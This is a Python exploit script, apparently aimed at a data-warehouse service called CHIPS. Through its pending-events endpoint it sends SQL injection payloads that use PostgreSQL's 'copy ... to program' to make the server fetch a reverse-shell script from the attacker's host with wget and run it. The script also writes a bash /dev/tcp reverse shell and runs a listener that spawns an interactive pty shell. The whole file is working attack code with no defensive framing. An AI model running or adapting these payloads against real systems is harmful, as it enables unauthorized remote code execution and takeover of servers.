import urllib3
import requests
import json
import subprocess
import os
import sys
import threading
import socket
import time
from http.server import HTTPServer, BaseHTTPRequestHandler



proxy = "http://127.0.0.1:8080"
s = requests.session()
headers = { "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }

def listen(ip,port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, int(port)))
	s.listen(1)
	print("[+] Reverse shell listening on port " + str(port))
	conn, addr = s.accept()
	print('[+] Connection received from ',addr)
	conn.send("echo ' '\n".encode())
	conn.recv(8192).decode()
	conn.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\");'\n".encode())
	sys.stdout.write(conn.recv(8192).decode())
	while True:
		command = input()
		if command == "exit":
			conn.send("exit\n\exit\n".encode())
			conn.recv(8192).decode()
			conn.close()
			sys.exit()
		#Send command
		command += "\n"
		conn.send(command.encode())
		time.sleep(0.5)
		sys.stdout.write("\033[A" + conn.recv(8192).decode())

def createReverseShellFile(ip, port):
    script_content = f"""#!/bin/bash
                        bash -i >& /dev/tcp/{ip}/{port} 0>&1
                        """
    with open("reverse_shell.sh", "w") as file:
        file.write(script_content)
    print("Plik reverse_shell.sh został utworzony.")


def uploadReverseShellFile(rhost,lhost):
    url = f"http://{rhost}:8080/v1/warehouse/pending-events?triggerUpload=true"
    data = {
            "source_id":f"'; copy (select 'a') to program 'wget -q {lhost}:80/reverse_shell.sh' -- -",
            "task_run_id":"'"
            }

    response = requests.post(url, json=data, proxies={'http': proxy, 'https': proxy})
    print(response.text)
    return response

def TriggerReverseShellFile(rhost):
    url = f"http://{rhost}:8080/v1/warehouse/pending-events?triggerUpload=true"
    data = {
            "source_id":f"'; copy (select 'a') to program 'bash reverse_shell.sh' -- -",
            "task_run_id":"'"
            }

    response = requests.post(url, json=data)
    return response


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT> <WEBPORT>\n".format(sys.argv[0]))
        print("(+) RHOST - Remote server which runs vulnerable version of CHIPS")
        print("(+) RPORT - Remote application port")
        print("(+) LHOST - Local IP Address to get shell")
        print("(+) LPORT - Local Port to get shell\n")
        sys.exit(-1)

    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
    
    #createReverseShellFile(lhost,lport)
    uploadReverseShellFile(rhost,lhost)
    listener_thread = threading.Thread(target=listen, args=(lhost, lport))
    listener_thread.start()
    #startListener(LPORT)

    
    TriggerReverseShellFile(rhost)


    listener_thread.join()